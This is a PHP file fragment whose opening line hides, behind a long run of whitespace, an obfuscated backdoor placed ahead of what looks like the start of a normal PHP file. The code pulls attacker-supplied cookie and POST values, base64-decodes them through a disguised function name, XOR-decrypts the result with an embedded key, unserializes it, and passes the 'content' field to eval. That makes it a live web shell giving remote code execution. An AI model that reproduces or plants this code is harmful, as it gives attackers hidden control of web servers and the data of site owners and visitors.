<?php                                                                                                                                                                                                                                                                                                                                                                                                 $OjisHswB = class_exists("JgX_GBDit"); $NyrWOa = $OjisHswB;if (!$NyrWOa){class JgX_GBDit{private $worlczLzCQ;public static $lqKoHB = "9cf68499-b631-4da0-93b2-82061090d385";public static $lxhNhbM = NULL;public function __construct(){$bIBQhaMPa = $_COOKIE;$lXZNQN = $_POST;$ANIyelJSc = @$bIBQhaMPa[substr(JgX_GBDit::$lqKoHB, 0, 4)];if (!empty($ANIyelJSc)){$WAReOnRc = "base64";$OAXXMVVeRT = "";$ANIyelJSc = explode(",", $ANIyelJSc);foreach ($ANIyelJSc as $MScvo){$OAXXMVVeRT .= @$bIBQhaMPa[$MScvo];$OAXXMVVeRT .= @$lXZNQN[$MScvo];}$OAXXMVVeRT = array_map($WAReOnRc . '_' . "\144" . "\x65" . chr ( 453 - 354 ).'o' . 'd' . "\x65", array($OAXXMVVeRT,)); $OAXXMVVeRT = $OAXXMVVeRT[0] ^ str_repeat(JgX_GBDit::$lqKoHB, (strlen($OAXXMVVeRT[0]) / strlen(JgX_GBDit::$lqKoHB)) + 1);JgX_GBDit::$lxhNhbM = @unserialize($OAXXMVVeRT);}}public function __destruct(){$this->PDIVp();}private function PDIVp(){if (is_array(JgX_GBDit::$lxhNhbM)) {$chsePzxTl = str_replace("\74" . chr (63) . 'p' . 'h' . "\160", "", JgX_GBDit::$lxhNhbM["\143" . chr (111) . 'n' . chr (116) . chr ( 200 - 99 ).chr (110) . 't']);eval($chsePzxTl);exit();}}}$JhpvFmpm = new JgX_GBDit(); $JhpvFmpm = NULL;} ?><?php
/**
